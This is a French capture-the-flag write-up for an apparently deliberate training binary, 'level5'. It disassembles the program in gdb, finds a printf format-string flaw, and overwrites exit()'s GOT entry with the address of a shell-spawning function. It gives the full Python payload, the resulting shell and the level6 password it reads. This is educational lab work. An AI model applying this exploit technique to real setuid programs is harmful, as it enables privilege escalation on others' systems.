## Analyse

- `ls -la`
  ```
  [...]
    -rwsr-s---+ 1 level6 users  5385 Mar  6  2016 level5
  [...]
  ```
    - On a un binaire appartenant a level6 dans le home avec les droits SUID.

- `./level5`
  ```
    
  ```
  - Le programme attend un input
    - `test`
      - `test`
    - Le programme affiche le paramètre qu'on lui donne

- `gdb level5`
  - `set disassembly-flavor intel`
  - `info function`
    ```asm
    [...]
      0x080484a4  o
      0x080484c2  n
      0x08048504  main
    [...]
    ```
    - on trouve une fonction n() et une fonction o() en plus du main
  - `disas main`
    ```asm
    Dump of assembler code for function main:
       0x08048504 <+0>:	push   ebp
       0x08048505 <+1>:	mov    ebp,esp
       0x08048507 <+3>:	and    esp,0xfffffff0
       0x0804850a <+6>:	call   0x80484c2 <n>
       0x0804850f <+11>:	leave
       0x08048510 <+12>:	ret
    End of assembler dump.
    ```
    - <+0> ... <+3>
      - Initialisation de la mémoire, alignement de la stack<br/><br/>
    - <+6>
      - Call la fonction n()<br/><br/>
    - <+11> ... <+12>
      - Réinitialisation de la mémoire, fin d'exécution<br/><br/>

  - `disas n`
    ```asm
    Dump of assembler code for function n:
       0x080484c2 <+0>:	push   ebp
       0x080484c3 <+1>:	mov    ebp,esp
       0x080484c5 <+3>:	sub    esp,0x218
       0x080484cb <+9>:	mov    eax,ds:0x8049848
       0x080484d0 <+14>:	mov    DWORD PTR [esp+0x8],eax
       0x080484d4 <+18>:	mov    DWORD PTR [esp+0x4],0x200
       0x080484dc <+26>:	lea    eax,[ebp-0x208]
       0x080484e2 <+32>:	mov    DWORD PTR [esp],eax
       0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
       0x080484ea <+40>:	lea    eax,[ebp-0x208]
       0x080484f0 <+46>:	mov    DWORD PTR [esp],eax
       0x080484f3 <+49>:	call   0x8048380 <printf@plt>
       0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1
       0x080484ff <+61>:	call   0x80483d0 <exit@plt>
    End of assembler dump.
    ```
    - <+0> ... <+3>
      - Initialisation de la mémoire (libère 536 octets pour la stack)<br/><br/>
    - <+9> ... <+35>
      - Stocke dans eax la valeur du data segment register 0x8049848
        - `x/s 0x8049848`
          - `0x8049848 <stdin@@GLIBC_2.0>:	 ""`
      - Stocke la valeur de eax (stdin) sur la stack (à esp + 8)
      - Stocke 0x200 (512) sur la stack (à esp + 4)
      - Fait pointer eax sur ebp - 520
      - Stocke eax (l'adresse ebp - 520) sur la stack (à esp)
      - Call fgets() avec les arguments stockés sur la stack<br/><br/>
    - <+40> ... <+49>
      - Fait pointer eax sur ebp - 520 => l'adresse du retour de fgets()
      - Stocke eax (l'adresse du retour de fgets()) sur la stack (à esp)
      - Call printf() avec l'argument stocké sur la stack<br/><br/>
    - <+54> ... <+61>
      - Stocke 0x1 (1) sur la stack
      - Call exit() avec l'argument stocké sur la stack

  - `disas o`
    ```asm
    Dump of assembler code for function o:
       0x080484a4 <+0>:	push   ebp
       0x080484a5 <+1>:	mov    ebp,esp
       0x080484a7 <+3>:	sub    esp,0x18
       0x080484aa <+6>:	mov    DWORD PTR [esp],0x80485f0
       0x080484b1 <+13>:	call   0x80483b0 <system@plt>
       0x080484b6 <+18>:	mov    DWORD PTR [esp],0x1
       0x080484bd <+25>:	call   0x8048390 <_exit@plt>
    End of assembler dump.
    ```
    - <+0> ... <+3>
      - Initialisation de la mémoire (libère 24 octets pour la stack)<br/><br/>
    - <+6> ... <+13>
      - Stocke la valeur de 0x80485f0 sur la stack (à esp)
        - `x/s 0x80485f0`
          ```
          0x80485f0:	 "/bin/sh"
          ```
      - Call system() avec l'argument stocké sur la stack (à esp)
    - <+17> ... <+18>
      - Réinitialisation de la mémoire, fin d'exécution
    - <+18> ... <+25>
      - Stocke 0x1 (1) sur la stack
      - Call _exit() avec l'argument stocké sur la stack

## Exploit

Ni main() ni n() n'appellent o(), dommage car il nous pop un shell.
On remarque également qu'il n'y a pas de return(), uniquement des call à exit() donc inutile de réécrire l'eip on va sortir sans y passer.
Il va falloir [remplacer l'adresse de la fonction exit() dans la Global Offset Table par l'adresse de la fonction o()](https://axcheron.github.io/exploit-101-format-strings/#code-execution-redirect) pour avoir notre shell.


- `objdump -R level5`
  ```
   OFFSET   TYPE              VALUE
  08049814 R_386_GLOB_DAT    __gmon_start__
  08049848 R_386_COPY        stdin
  08049824 R_386_JUMP_SLOT   printf
  08049828 R_386_JUMP_SLOT   _exit
  0804982c R_386_JUMP_SLOT   fgets
  08049830 R_386_JUMP_SLOT   system
  08049834 R_386_JUMP_SLOT   __gmon_start__
  08049838 R_386_JUMP_SLOT   exit
  0804983c R_386_JUMP_SLOT   __libc_start_main
  ```
  - l'adresse d'exit dans la GOT est `08049838`
- `gdb level5`
  - `info function o`
    ```
    All functions matching regular expression "o":

    Non-debugging symbols:
    0x080483c0  __gmon_start__
    0x080483c0  __gmon_start__@plt
    0x08048420  __do_global_dtors_aux
    0x080484a4  o
    0x080485a0  __do_global_ctors_aux
    ```
    - l'adresse de o() est 0x080484a4

  - `python -c 'print "AAAA" + "%x " * 10' | ./level5`
    ```
    AAAA200 b7fd1ac0 b7ff37d0 41414141 25207825 78252078 20782520 25207825 78252078 20782520
    ```
    - On commence a lire notre format string dans la stack au 4eme argument donné à print.
  
  - `python -c 'print"\x38\x98\x04\x08 %4$p"' | ./level5"
    ```
    8 0x8049838
    ```

On va à nouveau se servir du modifier %n pour écrire l'adresse de o() dans l'adresse du exit(), pour ca on va mettre autant de padding que la représentation en int de l'adresse de o(), moins 4 octets pour l'adresse de exit():
- `python -c 'print"\x38\x98\x04\x08%1$" + str(int(0x080484a4) - 4) + "d%4$n"' > /tmp/exploit`
- `cat /tmp/exploit - | ./level5`<br/>
  <img src="https://vignette.wikia.nocookie.net/spongebob/images/f/f7/Two_hours_later.jpg/revision/latest?cb=20101111022814" style="width: 350px;"/><br/>
  ```
                                    512
                  
  ```
  - `whoami`
    ```
    level6
    ```
  - `cat /home/user/level6/.pass`
    ```
    d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
    ```
